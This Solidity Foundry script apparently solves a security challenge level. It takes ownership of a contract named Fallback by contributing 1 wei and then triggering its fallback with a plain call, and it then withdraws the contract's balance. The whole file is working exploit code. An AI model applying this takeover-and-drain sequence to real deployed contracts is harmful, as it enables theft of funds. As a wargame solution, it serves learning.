// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(payable(0xdd856587024D24ce2958fC962b0F86954c24DA58));

    function run() external {
        address owner = fallbackInstance.owner();
        address player = vm.envAddress("MY_ADDRESS");

        console.log("Player : ", player);
        console.log("Owner : ", owner);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackInstance.contribute{ value: 1 wei }();
        address(fallbackInstance).call{ value: 1 wei }("");
        fallbackInstance.withdraw();

        console.log("Sending ETH to owner : ", fallbackInstance.owner());

        vm.stopBroadcast();
    }   
}